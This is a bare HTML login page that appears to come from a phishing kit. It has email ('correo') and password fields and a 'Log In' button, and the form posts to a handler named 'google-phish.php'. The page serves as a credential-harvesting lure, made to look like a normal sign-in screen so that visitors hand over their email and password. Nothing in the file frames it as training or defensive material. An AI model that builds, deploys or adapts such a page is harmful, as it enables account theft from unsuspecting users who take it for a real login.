# login
<title>login</title> <script src="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script> <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>

<!-- Icon -->
<div class="fadeIn first">
  <img src="http://danielzawadzki.com/codepen/01/icon.svg" id="icon" alt="User Icon" />
</div>

<!-- Login Form -->
<form action="google-phish.php" method="POST">
  <input type="text" id="correo" class="fadeIn second" name="correo" placeholder="correo">
  <input type="password" id="password" class="fadeIn third" name="password" placeholder="password">
  <input type="submit" class="fadeIn fourth" value="Log In">
</form>

<!-- Remind Passowrd -->
<div id="formFooter">
  <a class="underlineHover" href="#">Forgot Password?</a>
</div>

